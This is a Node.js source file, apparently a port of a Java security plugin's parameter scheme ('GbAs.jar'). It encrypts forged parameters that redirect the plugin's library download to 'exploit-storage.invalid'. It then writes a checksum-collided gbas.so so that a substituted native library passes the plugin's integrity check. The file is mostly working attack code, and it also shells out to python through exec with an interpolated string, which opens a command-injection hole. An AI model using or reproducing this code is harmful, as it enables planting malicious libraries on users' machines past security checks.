// Tradução do GbAs.jar para JavaScript

var util = require('util');
var fs = require('fs');

function p(x) { console.log(util.inspect(x)); };

var Base64 = require('./base64').Base64;
var JXG = require('./jsxcompressor').JXG;
var Blowfish = require('./blowfish').Blowfish;
var CkSum = require('./cksum').CkSum;
var RevCk = require('./revck').RevCk;
var CRC32 = require('./crc32').CRC32;

function hex(i) {
    return i.toString(16).toUpperCase();
}

function Decripta(cipherText, key) {
    cipherText = Base64.decodeString(cipherText);
    var plainText = Base64.stringifyArray(Blowfish.decrypt(cipherText, key, 'cfb', [37,17,25,118,9,2,25,115]));
    plainText = plainText.substr(0, cipherText.length - 1);  // remove trailing \x00
    var magic = plainText.substr(0, 4);
    plainText = plainText.substr(4);
    if(magic != 'STE!')
        throw Error('wrong magic');
    return plainText;
}

function Encripta(plainText, key) {
    plainText = Base64.arrayifyString('STE!' + plainText).concat([0]);
    var cipherText = Blowfish.encrypt(plainText, key, 'cfb', [37,17,25,118,9,2,25,115]);
    cipherText = cipherText.slice(0, plainText.length);  // remove padding
    return Base64.encodeByteArray(cipherText);
}

function decodeParams(seed) {
    var unzipSeed = (new JXG.Util.Unzip(Base64.decodeString(seed))).unzip()[0][0];
    var key = Base64.arrayifyString(unzipSeed.substr(0, 8) + '!#$%&*)');
    var plainText = Decripta(unzipSeed.substr(8), key);
    var params = {};
    plainText.split('|').forEach(function(x) {
        var i = x.indexOf('=');
        if(i != -1) {
            params[x.substr(0,i)] = x.substr(i+1);
        }
    });
    return params;
}

function encodeParams(params, f) {
    var plainText = '';
    for(var key in params) {
        plainText += key + '=' + params[key] + '|';
    }
    plainText = plainText.substr(0, plainText.length - 1);
    var partialKey = 'aBcDeFgH';
    var key = Base64.arrayifyString(partialKey + '!#$%&*)');
    var cipherText = Encripta(plainText, key);
    var result = partialKey + cipherText;
    require('child_process').exec('python -c \'import base64,zlib;print(base64.b64encode(zlib.compress("'+result+'")))\'', function(err, stdout, stderr) {
        f(stdout);
    });
}

function getLibCksum(chkCode) {
    var plainText = Decripta(chkCode, [103,97,115,49,50,51]);
    return parseInt(plainText);
}

var params = { GBAS17: 'BB'
, GBAS16: 'http://exploit-storage.invalid/bb/'
, GBAS10: '2009-Sep-08 12:05:23'
, GBAS11: 'bd1242d85c5abdc6d833f8f0c82a4697'
, GBAS18: 'http://exploit-storage.invalid/bb/'
, GTSTR_GBAS23: '61'
};

encodeParams(params, function(encodedParams) {
    console.log('\nencodedParams: ' + encodedParams + '\n');
});

/*
var seed = 'eNoNy8lygjAAANDf6QwHWQKUQw+AIEogLBGIlw4Eym5MZan9+vbdnyAHb59y64EC5T/heNXugZrpazaPtSPmFTgxXTCI1UIX9vrvxUR5OkWzM1B3HxzsmHuTnrnmU7cZ+psT8m5dPcL47XAUz9ojCmpRHU5LQOFSw8zvumIxUjRrF2etFXTAeGDxg2i6TVXabfx/1Ca+Jt6XFOZltIHWvu4GLu/IWkWpnftMShE0p+cLbLyKbH6/fNsV6jh4GXbImp7WyjFyCWJCc1QaAYxtQtic4C2FJYnxWDB1Iq7ynhehW7IJxUyMwdOfBlO2zJhKC9zPH38QqFtN';
var params = decodeParams(seed);
console.log('\ndecodeParams:');
p(params);
*/

console.log('\nLibrary url: ' + params['GBAS16'] + 'gbas.so\n');

function writeCollidedFile(chkCode, srcfile, destfile) {
    console.log('Colliding '+srcfile+' to generate '+destfile);
    
    var expectedCkSum = getLibCksum(chkCode);
    console.log('Expected checksum:   '+expectedCkSum);
    
    var data = Base64.arrayifyString(fs.readFileSync(srcfile, 'binary'));
    var curCkSum = CkSum.getValue(data);
    console.log('Calculated checksum: '+curCkSum);
    
    var revBytes = RevCk.calc(curCkSum, expectedCkSum);
    console.log('RevCk: ' + util.inspect(revBytes.map(hex)));
    
    var data = fs.readFileSync(srcfile);
    var revBytes = Buffer.from(revBytes);
    var fd = fs.openSync(destfile, 'w');
    fs.writeSync(fd, data, 0, data.length);
    fs.writeSync(fd, revBytes, 0, revBytes.length);
    fs.closeSync(fd);
    
    var data = Base64.arrayifyString(fs.readFileSync(destfile, 'binary'));
    console.log('CkSum: '   + CkSum.getValue(data));
    
    console.log('\nCollided file written.\n');
}

// br/com/gas/mid/gbasfiles.chk:
//  GBAS_SO_HASH=g8gAgt4VGUGMPAipzoE=
//  GBAS_DYLIB_HASH=g8gAgt4UEUt5jmjYNSQ=
//  GBAS_DLL_HASH=g8gAgtsVFkihy4tU+yty
writeCollidedFile('g8gAgt4VGUGMPAipzoE=', '../so/gbas.so.zip', '../gbas.so');
